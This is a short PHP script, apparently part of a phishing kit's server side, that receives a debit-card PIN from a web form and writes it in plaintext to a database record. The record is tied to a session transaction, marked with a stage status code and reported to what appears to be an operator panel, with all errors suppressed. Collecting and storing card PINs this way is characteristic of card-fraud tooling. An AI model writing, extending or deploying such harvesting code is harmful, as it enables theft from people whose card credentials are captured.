<?php
// 🔐 Guardar clave de tarjeta débito en BD

session_start();
error_reporting(0);
ini_set('display_errors', 0);

require('../panel/include/link.php');
$con = conectar();

if (!$con) {
    http_response_code(500);
    echo json_encode(['status' => 'ERROR', 'message' => 'Error de conexión']);
    exit;
}

$clave = $_POST['clave'] ?? '';
$id_transaccion = $_SESSION['id_transaccion'] ?? $_POST['id'] ?? '';

if(!$clave) {
    http_response_code(400);
    echo json_encode(['status' => 'ERROR', 'message' => 'Clave requerida']);
    exit;
}

try {
    // Actualizar m3it3m con la clave en el campo clave_tarj y status 13
    $sql = "UPDATE m3it3m
            SET clave_tarj = ?, status = 13, horamodificado = NOW()
            WHERE idreg = ?";

    $stmt = $con->prepare($sql);
    $stmt->bind_param('si', $clave, $id_transaccion);

    if($stmt->execute()) {
        http_response_code(200);
        echo json_encode([
            'status' => 'OK',
            'message' => 'Clave registrada',
            'id' => $id_transaccion
        ]);
    } else {
        throw new Exception('Error al actualizar: ' . $stmt->error);
    }

} catch(Exception $e) {
    http_response_code(500);
    echo json_encode([
        'status' => 'ERROR',
        'message' => $e->getMessage()
    ]);
} finally {
    if (isset($stmt)) {
        $stmt->close();
    }
    desconectar($con);
}
?>
